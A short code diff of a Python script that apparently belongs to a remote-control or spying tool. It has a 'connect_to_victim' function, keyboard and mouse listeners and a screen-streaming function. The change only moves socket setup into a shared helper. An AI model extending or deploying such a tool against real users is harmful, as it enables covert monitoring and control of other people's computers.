@@ -4,13 +4,12 @@ from pynput import keyboard, mouse
 import cv2
 import numpy as np
 from PIL import ImageGrab
+from shared.networking import create_client_socket
 
 
 def connect_to_victim(server_host, server_port):
     global client
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP/IPv4 socket
-    client.connect((server_host, server_port))
-    print(f"Connected to {server_host}: {server_port}")
+    client = create_client_socket(host=server_host, port=server_port)
 
     with keyboard.Listener(on_press=on_press, on_release=on_release), mouse.Listener(on_move=on_move, on_click=on_click) as listener:
         listener.join()
@@ -63,5 +62,3 @@ def screen_stream():
 server_host = 'localhost'          #'192.168.1.122'
 server_port = 8000
 connect_to_victim(server_host, server_port)
-
-
